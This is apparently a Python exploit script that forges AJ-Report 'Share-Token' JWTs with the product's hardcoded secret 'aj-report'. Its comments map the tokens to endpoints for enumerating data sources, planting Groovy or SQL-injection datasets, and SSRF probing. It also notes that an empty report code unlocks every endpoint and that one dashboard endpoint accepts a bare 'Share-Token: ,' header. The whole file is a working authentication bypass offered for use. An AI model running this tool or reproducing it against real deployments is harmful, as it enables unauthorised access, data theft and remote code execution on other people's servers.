#!/usr/bin/env python3
"""
AJ-Report Share-Token 自签工具（HS256, 密钥 = 源码硬编码 "aj-report", JwtUtil.java:24）
用法:

    python mk_share_token.py --any

"""
import hmac, hashlib, base64, json, sys

SECRET = b"aj-report"  # JwtUtil.java:24, 硬编码不可配置

COMMON = {
    "queryAllDataSet":  "GET  /dataSet/queryAllDataSet   枚举数据集",
    "queryAllDataSource": "GET /dataSource/queryAllDataSource 枚举数据源",
    "dataSource":       "POST /dataSource               创建数据源",
    "dataSet":          "POST /dataSet                  植入数据集(Groovy/SQLi)",
    "reportExcel":      "POST /reportExcel              创建Excel报表",
    "exportExcel":      "POST /reportExcel/exportExcel  导出(1.4.2需此token)",
    "testConnection":   "POST /dataSource/testConnection SSRF探测",
    "accessUser":       "GET  /accessUser/...           用户相关",
}

def b64(d: bytes) -> str:
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

def mk(report_code: str) -> str:
    header = b64(json.dumps({"typ": "JWT", "alg": "HS256"}, separators=(",", ":")).encode())
    payload = b64(json.dumps({"reportCode": report_code, "shareCode": "x"}, separators=(",", ":")).encode())
    sig = b64(hmac.new(SECRET, (header + "." + payload).encode(), hashlib.sha256).digest())
    return f"{header}.{payload}.{sig}"

if __name__ == "__main__":
    if len(sys.argv) < 2 or sys.argv[1] == "--list":
        print("常用 reportCode → 端点:")
        for k, v in COMMON.items():
            print(f"  {k:20s} {v}")
        print(f"  {'(空串,即 --any)':20s} 所有端点通用 —— uri.contains('') 恒为 true")
        sys.exit(0)
    rc = "" if sys.argv[1] in ("--any", "-any", "*") else sys.argv[1]
    tok = mk(rc)
    print(f"reportCode : '{rc}'")
    print(f"Share-Token: {tok}")
    print(f"\n提示: 打 /reportDashboard/getData 触发数据集时无需本工具, 直接 'Share-Token: ,' 即可")
